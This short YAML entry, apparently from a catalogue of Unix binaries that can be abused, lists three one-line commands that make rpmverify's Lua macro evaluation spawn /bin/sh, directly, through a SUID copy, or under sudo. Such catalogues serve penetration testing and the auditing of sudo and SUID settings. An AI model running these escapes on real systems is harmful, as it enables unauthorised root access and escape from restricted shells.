---
functions:
  shell:
    - code: rpmverify --eval '%{lua:posix.exec("/bin/sh")}'
  limited-suid:
    - code: ./rpmverify --eval '%{lua:os.execute("/bin/sh")}'
  sudo:
    - code: sudo rpmverify --eval '%{lua:posix.exec("/bin/sh")}'
---
